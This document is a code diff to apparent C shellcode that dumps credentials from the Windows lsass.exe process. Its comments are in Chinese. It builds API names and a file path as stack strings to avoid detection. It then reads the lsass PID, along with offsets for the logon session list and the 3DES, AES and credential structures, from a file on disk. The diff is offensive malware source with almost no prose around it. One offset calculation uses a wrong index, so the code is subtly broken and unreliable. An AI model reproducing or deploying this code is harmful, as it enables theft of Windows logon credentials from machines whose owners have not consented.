@@ -195,6 +195,57 @@ inline bool _compare_lsass_name(char* dll_name) {
     return true;
 }
 
+inline DWORD64 _return_hex_value(char _hex_char) {
+    if (_hex_char == '0') {
+        return 0;
+    }
+    if (_hex_char == '1') {
+        return 1;
+    }
+    if (_hex_char == '2') {
+        return 2;
+    }
+    if (_hex_char == '3') {
+        return 3;
+    }
+    if (_hex_char == '4') {
+        return 4;
+    }
+    if (_hex_char == '5') {
+        return 5;
+    }
+    if (_hex_char == '6') {
+        return 6;
+    }
+    if (_hex_char == '7') {
+        return 7;
+    }
+    if (_hex_char == '8') {
+        return 8;
+    }
+    if (_hex_char == '9') {
+        return 9;
+    }
+    if (_hex_char == 'a') {
+        return 10;
+    }
+    if (_hex_char == 'b') {
+        return 11;
+    }
+    if (_hex_char == 'c') {
+        return 12;
+    }
+    if (_hex_char == 'd') {
+        return 13;
+    }
+    if (_hex_char == 'e') {
+        return 14;
+    }
+    if (_hex_char == 'f') {
+        return 15;
+    }
+
+}
 
 inline bool _compare_lsasrv_name(char* dll_name) {
     // char zGlRm[] = { 'l','s','a','s','r','v','.','d','l','l',0 }; 
@@ -286,6 +337,11 @@ int main() {
     stack_string[0] = 'R'; stack_string[1] = 'e'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'F'; stack_string[5] = 'i'; stack_string[6] = 'l'; stack_string[7] = 'e';
     PNT_ReadFile NT_ReadFile = (PNT_ReadFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
 
+
+    SecureZeroMemory(stack_string, 50);
+    stack_string[0] = 'C'; stack_string[1] = 'l'; stack_string[2] = 'o'; stack_string[3] = 's'; stack_string[4] = 'e'; stack_string[5] = 'H'; stack_string[6] = 'a'; stack_string[7] = 'n'; stack_string[8] = 'd'; stack_string[9] = 'l'; stack_string[10] = 'e';
+    PNT_CloseHandle NT_CloseHandle = (PNT_CloseHandle)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
+
     // 获取文件句柄
     SecureZeroMemory(stack_string, 50);
     stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'i'; stack_string[17] = 'l'; stack_string[18] = 'i'; stack_string[19] = '6'; stack_string[20] = 'a'; stack_string[21] = 'o';
@@ -298,35 +354,110 @@ int main() {
         NULL);
     if (INVALID_HANDLE_VALUE == hFile)  return 0;
     // 读取文件
-    char _buffer[11] = { 0 };
+    SecureZeroMemory(stack_string, 50);
     DWORD out = 0;
     if (NT_ReadFile(hFile,
-        _buffer,
-        10,
+        stack_string,
+        50,
         &out,
         NULL
     ) == FALSE)
         return 0;
 
     // 关闭文件句柄
-    SecureZeroMemory(stack_string, 50);
-    stack_string[0] = 'C'; stack_string[1] = 'l'; stack_string[2] = 'o'; stack_string[3] = 's'; stack_string[4] = 'e'; stack_string[5] = 'H'; stack_string[6] = 'a'; stack_string[7] = 'n'; stack_string[8] = 'd'; stack_string[9] = 'l'; stack_string[10] = 'e';
-    PNT_CloseHandle NT_CloseHandle = (PNT_CloseHandle)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
     NT_CloseHandle(hFile);
 
     // 当前情况下，我们的table长度不超过100，就算以后也大概率不会超过1000，所以
     // 我按照3位数进行处理
-    DWORD _index = (_buffer[0] - '0') * 100 + (_buffer[1] - '0') * 10 + (_buffer[2] - '0');
-    DWORD _logon_session_list_offset = _offset_table[_index][0];
-    DWORD _3des_key_offset = _offset_table[_index][1];
-    DWORD _aes_key_offset = _offset_table[_index][2];
-    DWORD _credential_offset = _offset_table[_index][3];
+    // 现在这种写法，我们需要经常回来修改shellcode代码，用起来很麻烦，因为需要修改里面硬编码的数组
+    // shellcode的制作很蛋疼，所以我决定把偏移量直接写在文件里我们在这边读取即可
+    DWORD _index = (stack_string[0] - '0') * 100 + (stack_string[1] - '0') * 10 + (stack_string[2] - '0');
+
 
     // 剩下的7位，是lsass.exe进程的PID
-    DWORD _lsass_pid = (_buffer[3] - '0') * 1000000 + (_buffer[4] - '0') * 100000 +
-        (_buffer[5] - '0') * 10000 + (_buffer[6] - '0') * 1000 +
-        (_buffer[7] - '0') * 100 + (_buffer[8] - '0') * 10 +
-        (_buffer[9] - '0');
+    DWORD _lsass_pid = (stack_string[3] - '0') * 1000000 + (stack_string[4] - '0') * 100000 +
+        (stack_string[5] - '0') * 10000 + (stack_string[6] - '0') * 1000 +
+        (stack_string[7] - '0') * 100 + (stack_string[8] - '0') * 10 +
+        (stack_string[9] - '0');
+
+
+
+    // 计算各offset
+    DWORD64 _logon_session_list_offset =
+        _return_hex_value(stack_string[10]) << 28;
+     _logon_session_list_offset +=
+        _return_hex_value(stack_string[11]) << 24;
+     _logon_session_list_offset +=
+        _return_hex_value(stack_string[12]) << 20;
+     _logon_session_list_offset +=
+        _return_hex_value(stack_string[13]) << 16;
+     _logon_session_list_offset +=
+        _return_hex_value(stack_string[14]) << 12;
+     _logon_session_list_offset +=
+        _return_hex_value(stack_string[15]) << 8;
+     _logon_session_list_offset +=
+        _return_hex_value(stack_string[16]) << 4;
+     _logon_session_list_offset += 
+        _return_hex_value(stack_string[17]);
+
+
+     DWORD64 _3des_key_offset =
+         _return_hex_value(stack_string[8 + 10]) << 28;
+     _3des_key_offset +=
+         _return_hex_value(stack_string[8 + 11]) << 24;
+     _3des_key_offset +=
+         _return_hex_value(stack_string[8 + 12]) << 20;
+     _3des_key_offset +=
+         _return_hex_value(stack_string[8 + 13]) << 16;
+     _3des_key_offset +=
+         _return_hex_value(stack_string[8 + 14]) << 12;
+     _3des_key_offset +=
+         _return_hex_value(stack_string[8 + 15]) << 8;
+     _3des_key_offset +=
+         _return_hex_value(stack_string[8 + 16]) << 4;
+     _3des_key_offset +=
+         _return_hex_value(stack_string[8 + 17]);
+
+
+     DWORD64 _aes_key_offset =
+         _return_hex_value(stack_string[8 + 8 + 10]) << 28;
+     _aes_key_offset +=
+         _return_hex_value(stack_string[8 + 8 + 11]) << 24;
+     _aes_key_offset +=
+         _return_hex_value(stack_string[8 + 8 + 12]) << 20;
+     _aes_key_offset +=
+         _return_hex_value(stack_string[8 + 8 + 13]) << 16;
+     _aes_key_offset +=
+         _return_hex_value(stack_string[8 + 8 + 14]) << 12;
+     _aes_key_offset +=
+         _return_hex_value(stack_string[8 + 8 + 15]) << 8;
+     _aes_key_offset +=
+         _return_hex_value(stack_string[8 + 8 + 16]) << 4;
+     _aes_key_offset += 
+        _return_hex_value(stack_string[8 + 8 + 17]);
+
+
+     DWORD64 _credential_offset =
+         _return_hex_value(stack_string[8 + 8 + 10]) << 28;
+     _credential_offset +=
+         _return_hex_value(stack_string[8 + 8 + 8 + 11]) << 24;
+     _credential_offset +=
+         _return_hex_value(stack_string[8 + 8 + 8 + 12]) << 20;
+     _credential_offset +=
+         _return_hex_value(stack_string[8 + 8 + 8 + 13]) << 16;
+     _credential_offset +=
+         _return_hex_value(stack_string[8 + 8 + 8 + 14]) << 12;
+     _credential_offset +=
+         _return_hex_value(stack_string[8 + 8 + 8 + 15]) << 8;
+     _credential_offset +=
+         _return_hex_value(stack_string[8 + 8 + 8 + 16]) << 4;
+     _credential_offset +=
+         _return_hex_value(stack_string[8 + 8 + 8 + 17]);
+
+
+    // DWORD _3des_key_offset = _offset_table[_index][1];
+    // DWORD _aes_key_offset = _offset_table[_index][2];
+    // DWORD _credential_offset = _offset_table[_index][3];
 
 
     // printf("%d\t%d\t%d\n", _logon_session_list_offset, _3des_key_offset, _aes_key_offset);
